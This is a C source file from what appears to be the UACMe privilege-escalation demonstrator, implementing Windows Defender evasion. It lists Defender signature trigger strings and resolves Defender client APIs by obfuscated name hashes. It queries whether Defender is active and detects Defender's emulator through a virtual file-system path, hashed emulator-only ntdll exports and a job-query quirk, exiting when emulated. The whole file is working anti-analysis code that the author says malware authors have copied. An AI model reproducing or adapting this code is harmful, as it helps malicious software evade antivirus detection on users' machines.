/*******************************************************************************
*
*  (C) COPYRIGHT AUTHORS, 2015 - 2019
*
*  TITLE:       WINDEFEND.C
*
*  VERSION:     3.18
*
*  DATE:        29 Mar 2019
*
*  MSE / Windows Defender anti-emulation part.
*
*  WARNING: Kernel32/ntdll only dependencies.
*
*  Short FAQ:
*
*  Q: Why this module included in UACMe,
*     I thought this is demonstrator tool not real malware?
*
*  A: WinDefender is a default AV software installed on every Windows
*     since Windows 8. Because some of the lazy malware authors copy-pasted
*     whole UACMe project in their crappiest malware WinDefender has
*     several signatures to detect UACMe and it components.
*     Example of WinDefend signature: Bampeass. We cannot be prevented by this
*     as this demonstrator must be running on newest Windows OS versions.
*
* THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
* ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
* TO THE IMPLIED WARRANTIES OF MERCHANTABILITY AND/OR FITNESS FOR A
* PARTICULAR PURPOSE.
*
*******************************************************************************/

#include "shared.h"

#pragma warning(push)
#pragma warning(disable: 4055)
#pragma warning(disable: 4152)

/*

WD Signatures

Trojan:Win64/Bampeass.A

Triggers:
[ U C M ]   W u s a   f a i l e d   c o p y   H i b i k i
% t e m p % \ H i b i k i . d l l
E l e v a t i o n : A d m i n i s t r a t o r ! n e w : { 4 D 1 1 1 E 0 8 - C B F 7 - 4 f 1 2 - A 9 2 6 - 2 C 7 9 2 0 A F 5 2 F C }
U A C M e   i n j e c t e d ,   F u b u k i   a t   y o u r   s e r v i c e


Trojan:Win64/Bampeass.B

Triggers:
UACMe injected, Hibiki at your service.
ucmLoadCallback, dll load %ws, DllBase = %


Trojan:Win64/Bampeass.C

Triggers:
ucmLoadCallback, dll load %ws, DllBase = %p
UACMe injected, Hibiki at your service.
ucmLoadCallback, kernel32 base found

*/


//
// General purpose hashes start here.
//

#define WDStatus_Hash               0x5ed47491
#define MpManagerOpen_Hash          0x156db96c
#define MpHandleClose_Hash          0x1117328a
#define MpManagerVersionQuery_Hash  0x214efb07

//
// End of general purpose hashes.
//

//
// Kuma related hashes start here.
//

//
// End of Kuma related hashes.
//

DWORD wdxEmulatorAPIHashTable[] = {
    0x70CE7692,
    0xD4CE4554,
    0x7A99CFAE
};

MP_API g_MpApiSet;

PVOID wdxGetProcedureAddressByHash(
    _In_ PVOID MpClientBase,
    _In_ DWORD ProcedureHash);

/*
* wdxInitApiSet
*
* Purpose:
*
* Retrieve required routine pointers from client dll.
*
*/
BOOL wdxInitApiSet(
    _In_ PVOID MpClientBase)
{
    g_MpApiSet.WDStatus.Hash = WDStatus_Hash;
    g_MpApiSet.WDStatus.Routine = (pfnMpRoutine)wdxGetProcedureAddressByHash(
        MpClientBase,
        g_MpApiSet.WDStatus.Hash);

    if (g_MpApiSet.WDStatus.Routine == NULL) return FALSE;

    g_MpApiSet.MpHandleClose.Hash = MpHandleClose_Hash;
    g_MpApiSet.MpHandleClose.Routine = (pfnMpRoutine)wdxGetProcedureAddressByHash(
        MpClientBase,
        g_MpApiSet.MpHandleClose.Hash);

    if (g_MpApiSet.MpHandleClose.Routine == NULL) return FALSE;

    g_MpApiSet.MpManagerOpen.Hash = MpManagerOpen_Hash;
    g_MpApiSet.MpManagerOpen.Routine = (pfnMpRoutine)wdxGetProcedureAddressByHash(
        MpClientBase,
        g_MpApiSet.MpManagerOpen.Hash);

    if (g_MpApiSet.MpManagerOpen.Routine == NULL) return FALSE;

    g_MpApiSet.MpManagerVersionQuery.Hash = MpManagerVersionQuery_Hash;
    g_MpApiSet.MpManagerVersionQuery.Routine = (pfnMpRoutine)wdxGetProcedureAddressByHash(
        MpClientBase,
        g_MpApiSet.MpManagerVersionQuery.Hash);

    if (g_MpApiSet.MpManagerVersionQuery.Routine == NULL) return FALSE;

    //
    //  Kuma part.
    //

    return TRUE;
}

/*
* wdGetAVSignatureVersion
*
* Purpose:
*
* Retrieve current AV signature version.
*
*/
_Success_(return != FALSE)
BOOL wdGetAVSignatureVersion(
    _Out_ PMPCOMPONENT_VERSION SignatureVersion
)
{
    BOOL bResult = FALSE;
    MPHANDLE MpHandle;

    MPVERSION_INFO VersionInfo;

    pfnMpManagerOpen MpManagerOpen = (pfnMpManagerOpen)g_MpApiSet.MpManagerOpen.Routine;
    pfnMpHandleClose MpHandleClose = (pfnMpHandleClose)g_MpApiSet.MpHandleClose.Routine;
    pfnMpManagerVersionQuery MpManagerVersionQuery = (pfnMpManagerVersionQuery)g_MpApiSet.MpManagerVersionQuery.Routine;

    if (S_OK == MpManagerOpen(0, &MpHandle)) {
        RtlSecureZeroMemory(&VersionInfo, sizeof(VersionInfo));
        bResult = (S_OK == MpManagerVersionQuery(MpHandle, &VersionInfo));
        RtlCopyMemory(SignatureVersion, &VersionInfo.AVSignature, sizeof(VersionInfo.AVSignature));
        MpHandleClose(MpHandle);
    }
    return bResult;
}

/*
* wdIsEnabled
*
* Purpose:
*
* Return STATUS_TOO_MANY_SECRETS if WD is present and active.
*
*/
NTSTATUS wdIsEnabled(
    VOID)
{
    BOOL fEnabled = FALSE;
    NTSTATUS status = STATUS_NOTHING_TO_TERMINATE;
    pfnWDStatus WDStatus = (pfnWDStatus)g_MpApiSet.WDStatus.Routine;

    if (WDStatus) 
        if (SUCCEEDED(WDStatus(&fEnabled)))
        {
            if (fEnabled)
                status = STATUS_TOO_MANY_SECRETS;
            else
                status = STATUS_NO_SECRETS;
        }
        else
            status = STATUS_NO_SECRETS;

    return status;
}

/*
* wdxGetHashForString
*
* Purpose:
*
* Calculates specific hash for string.
*
*/
DWORD wdxGetHashForString(
    _In_ char *s
)
{
    DWORD h = 0;

    while (*s != 0) {
        h ^= *s;
        h = RotateLeft32(h, 3) + 1;
        s++;
    }

    return h;
}

/*
* wdxGetProcedureAddressByHash
*
* Purpose:
*
* Return pointer to function in MpClient from name hash value.
*
*/
PVOID wdxGetProcedureAddressByHash(
    _In_ PVOID MpClientBase,
    _In_ DWORD ProcedureHash
)
{
    DWORD i;
    ULONG sz = 0;

    IMAGE_DOS_HEADER *DosHeader;
    IMAGE_EXPORT_DIRECTORY *Exports;
    PDWORD Names, Functions;
    PWORD Ordinals;

    DWORD_PTR FunctionPtr;

    DosHeader = (IMAGE_DOS_HEADER*)MpClientBase;

    Exports = (IMAGE_EXPORT_DIRECTORY*)RtlImageDirectoryEntryToData(MpClientBase, TRUE,
        IMAGE_DIRECTORY_ENTRY_EXPORT, &sz);

    if (Exports == NULL)
        return NULL;

    Names = (PDWORD)((PBYTE)DosHeader + Exports->AddressOfNames);
    Ordinals = (PWORD)((PBYTE)DosHeader + Exports->AddressOfNameOrdinals);
    Functions = (PDWORD)((PBYTE)DosHeader + Exports->AddressOfFunctions);

    for (i = 0; i < Exports->NumberOfNames; i++) {
        if (wdxGetHashForString((char *)((PBYTE)DosHeader + Names[i])) == ProcedureHash) {
            FunctionPtr = Functions[Ordinals[i]];
            return (PBYTE)MpClientBase + FunctionPtr;
        }
    }

    return NULL;
}

/*
* wdLoadClient
*
* Purpose:
*
* Load mpengine client dll for further work (e.g. Kuma).
*
* Limitations:
*
*   Warning: This routine will produce incorrect results under MS AV emulator.
*
*/
_Success_(return != NULL)
PVOID wdLoadClient(
    _In_ BOOL IsWow64,
    _Out_opt_ PNTSTATUS Status
)
{
    BOOL        bFound = FALSE;
    HANDLE      hHeap = NtCurrentPeb()->ProcessHeap;
    PVOID       ImageBase = NULL;
    NTSTATUS    status = STATUS_UNSUCCESSFUL;

    PWCHAR EnvironmentBlock = (PWCHAR)NtCurrentPeb()->ProcessParameters->Environment;
    PWCHAR ptr, lpProgramFiles, lpBuffer;

    UNICODE_STRING usTemp, *us;

    SIZE_T memIO;

    UNICODE_STRING us1 = RTL_CONSTANT_STRING(L"ProgramFiles=");
    UNICODE_STRING us2 = RTL_CONSTANT_STRING(L"ProgramFiles(x86)=");

    us = &us1;

    if (IsWow64)
        us = &us2;

    ptr = EnvironmentBlock;

    do {
        if (*ptr == 0)
            break;

        RtlInitUnicodeString(&usTemp, ptr);
        if (RtlPrefixUnicodeString(us, &usTemp, TRUE)) {
            bFound = TRUE;
            break;
        }

        ptr += _strlen(ptr) + 1;

    } while (1);

    if (bFound) {

        lpProgramFiles = (ptr + us->Length / sizeof(WCHAR));

        memIO = (MAX_PATH + _strlen(lpProgramFiles)) * sizeof(WCHAR);
        lpBuffer = (PWCHAR)RtlAllocateHeap(hHeap, HEAP_ZERO_MEMORY, memIO);
        if (lpBuffer) {
            _strcpy(lpBuffer, lpProgramFiles);
            _strcat(lpBuffer, TEXT("\\Windows Defender\\MpClient.dll"));

            RtlInitUnicodeString(&usTemp, lpBuffer);

            status = LdrLoadDll(NULL, NULL, &usTemp, &ImageBase);

            if (NT_SUCCESS(status)) {
                if (!wdxInitApiSet(ImageBase)) {
                    status = STATUS_PROCEDURE_NOT_FOUND;
                    LdrUnloadDll(ImageBase);
                    ImageBase = NULL;
                }
            }

            RtlFreeHeap(hHeap, 0, lpBuffer);
        }
        else {
            status = STATUS_NO_MEMORY;
        }
    }
    else
        status = STATUS_VARIABLE_NOT_FOUND;

    if (Status) 
        *Status = status;

    return ImageBase;
}

/*
* wdCheckEmulatedVFS
*
* Purpose:
*
* Detect Microsoft Security Engine emulation by it own VFS artefact.
*
* Microsoft AV provides special emulated environment for scanned application where it
* fakes general system information, process environment structures/data to make sure
* API calls are transparent for scanned code. It also use simple Virtual File System
* allowing this AV track file system changes and if needed continue emulation on new target.
*
* This method implemented in commercial malware presumable since 2013.
*
*/
VOID wdCheckEmulatedVFS(
    VOID
)
{
    WCHAR szBuffer[MAX_PATH];
    WCHAR szMsEngVFS[12] = { L':', L'\\', L'm', L'y', L'a', L'p', L'p', L'.', L'e', L'x', L'e', 0 };

    RtlSecureZeroMemory(&szBuffer, sizeof(szBuffer));
    GetModuleFileName(NULL, szBuffer, MAX_PATH);
    if (_strstri(szBuffer, szMsEngVFS) != NULL) {
        ExitProcess((UINT)0);
    }
}

/*
* wdIsEmulatorPresent
*
* Purpose:
*
* Detect MS emulator state.
*
*/
NTSTATUS wdIsEmulatorPresent(
    VOID)
{
    PCHAR ImageBase = NULL;

    IMAGE_DOS_HEADER *DosHeader;
    IMAGE_EXPORT_DIRECTORY *Exports;
    PDWORD Names;

    ULONG i, c, Hash, sz = 0;

    UNICODE_STRING usNtdll = RTL_CONSTANT_STRING(L"ntdll.dll");

    if (!NT_SUCCESS(LdrGetDllHandleEx(LDR_GET_DLL_HANDLE_EX_UNCHANGED_REFCOUNT,
        NULL, NULL, &usNtdll, &ImageBase)))
    {
        return STATUS_DLL_NOT_FOUND;
    }

    Exports = (IMAGE_EXPORT_DIRECTORY*)RtlImageDirectoryEntryToData(ImageBase, TRUE,
        IMAGE_DIRECTORY_ENTRY_EXPORT, &sz);

    if (Exports == NULL)
        return STATUS_INVALID_IMAGE_FORMAT;

    DosHeader = (IMAGE_DOS_HEADER*)ImageBase;
    Names = (PDWORD)((PBYTE)DosHeader + Exports->AddressOfNames);

    for (i = 0; i < Exports->NumberOfNames; i++) {
        Hash = wdxGetHashForString((char *)((PBYTE)DosHeader + Names[i]));
        for (c = 0; c < RTL_NUMBER_OF(wdxEmulatorAPIHashTable); c++) {
            if (Hash == wdxEmulatorAPIHashTable[c])
                return STATUS_NEEDS_REMEDIATION;
        }
    }

    return STATUS_NOT_SUPPORTED;
}

/*
* wdIsEmulatorPresent2
*
* Purpose:
*
* Detect MS emulator state 2.
*
* Microsoft AV defines virtual environment dlls loaded in runtime from VDM files.
* These fake libraries implement additional detection layer and come with a lot of
* predefined values.
*
*/
BOOLEAN wdIsEmulatorPresent2(
    VOID)
{   
    return NtIsProcessInJob(NtCurrentProcess(), UlongToHandle(10)) == 0x125;
}

#pragma warning(pop)
